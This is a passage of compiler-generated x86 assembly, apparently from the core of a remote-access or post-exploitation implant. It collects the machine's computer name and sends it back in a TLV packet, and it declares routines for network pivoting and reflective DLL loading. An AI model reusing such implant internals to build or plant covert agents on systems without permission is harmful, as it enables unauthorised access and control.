	movl	%eax, 4(%esp)
	leal	-548(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__GetComputerNameA@8, %eax
	call	*%eax
	subl	$8, %esp
	movl	-28(%ebp), %eax
	movzwl	%ax, %edx
	movl	-28(%ebp), %eax
	shrl	$16, %eax
	movzwl	%ax, %eax
	leal	-548(%ebp), %ecx
	movl	%ecx, 24(%esp)
	movl	%edx, 20(%esp)
	movl	%eax, 16(%esp)
	movl	$LC27, 12(%esp)
	movl	$259, 8(%esp)
	movl	$260, 4(%esp)
	leal	-1068(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp___snwprintf_s, %eax
	call	*%eax
	leal	-1068(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	$65996, 4(%esp)
	movl	-16(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_add_tlv_wstring
	leal	-1068(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	$LC28, (%esp)
	call	_real_dprintf
L85:
	movl	-16(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	8(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	-12(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_transmit_response
L84:
	movl	$0, %eax
	leave
	ret
	.ident	"GCC: (GNU) 9.3-win32 20200320"
	.def	_strlen;	.scl	2;	.type	32;	.endef
	.def	_vsnprintf_s;	.scl	2;	.type	32;	.endef
	.def	_request_core_pivot_add;	.scl	2;	.type	32;	.endef
	.def	_request_core_pivot_remove;	.scl	2;	.type	32;	.endef
	.def	_packet_add_tlv_uint;	.scl	2;	.type	32;	.endef
	.def	_packet_get_tlv_value_wstring;	.scl	2;	.type	32;	.endef
	.def	_packet_create_response;	.scl	2;	.type	32;	.endef
	.def	_packet_get_tlv_value_uint;	.scl	2;	.type	32;	.endef
	.def	_list_enumerate;	.scl	2;	.type	32;	.endef
	.def	_packet_transmit_response;	.scl	2;	.type	32;	.endef
	.def	_command_deregister_all;	.scl	2;	.type	32;	.endef
	.def	_deregister_base_dispatch_routines;	.scl	2;	.type	32;	.endef
	.def	_list_create;	.scl	2;	.type	32;	.endef
	.def	_register_base_dispatch_routines;	.scl	2;	.type	32;	.endef
	.def	_command_register_all;	.scl	2;	.type	32;	.endef
	.def	_malloc;	.scl	2;	.type	32;	.endef
	.def	_memset;	.scl	2;	.type	32;	.endef
	.def	_list_push;	.scl	2;	.type	32;	.endef
	.def	_list_pop;	.scl	2;	.type	32;	.endef
	.def	_free;	.scl	2;	.type	32;	.endef
	.def	_list_destroy;	.scl	2;	.type	32;	.endef
	.def	_GetProcAddressR@8;	.scl	2;	.type	32;	.endef
	.def	_packet_get_tlv_value_string;	.scl	2;	.type	32;	.endef
	.def	_packet_get_tlv;	.scl	2;	.type	32;	.endef
	.def	_packet_get_tlv_value_reflective_loader;	.scl	2;	.type	32;	.endef
	.def	_LoadLibraryR@12;	.scl	2;	.type	32;	.endef
	.def	_libloader_load_library;	.scl	2;	.type	32;	.endef
	.def	_packet_get_tlv_value_raw;	.scl	2;	.type	32;	.endef
	.def	_memcpy;	.scl	2;	.type	32;	.endef
	.def	_packet_add_tlv_raw;	.scl	2;	.type	32;	.endef
	.def	_packet_transmit_empty_response;	.scl	2;	.type	32;	.endef
	.def	_wcschr;	.scl	2;	.type	32;	.endef
	.def	_packet_add_tlv_wstring;	.scl	2;	.type	32;	.endef
